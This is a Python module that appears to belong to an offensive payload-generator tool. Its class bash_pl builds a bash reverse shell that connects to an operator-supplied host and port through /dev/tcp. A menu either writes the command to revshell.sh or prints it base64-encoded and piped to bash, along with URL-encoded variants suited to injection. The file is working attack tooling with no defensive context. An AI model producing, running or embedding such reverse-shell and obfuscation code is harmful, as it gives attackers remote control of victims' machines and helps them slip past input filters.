import os, sys
sys.path.append(os.path.dirname(os.path.abspath(__file__)))
from do_enc import *
 
class bash_pl:
    def __init__(self, args, pl_path):
        self.args = args
        self.pl_path = pl_path
        self.cmd = f"bash -c 'bash -i >& /dev/tcp/{self.args.lhost}/{self.args.lport} 0>&1'"

    def menu(self):
        print("\n--- Bash Payload ---")
        print("1. Plain     [revshell.sh]")
        print("2. Base64")
        choice = input(": ")
        if choice == "1":
            self.plain()
        elif choice == "2":
            self.b64()

    def plain(self):
        content = f'#!/bin/bash\n{self.cmd}'
        with open(f'{self.pl_path}revshell.sh', 'w') as file:
            file.write(content)
        os.system(f'cp {self.pl_path}revshell.sh .')
    
    def b64(self):
        print(f'\n>Plain:\n{self.cmd}')
        payload = f"echo {base64_encode(self.cmd)} | base64 -d | bash"
        print(f'\n>Normal:\n{payload}')
        print(f'\n>URL encoded:\n{url_encode(payload)}')
        print(f'\n>URL encoded all:\n{url_encode_all(payload)}')
        print()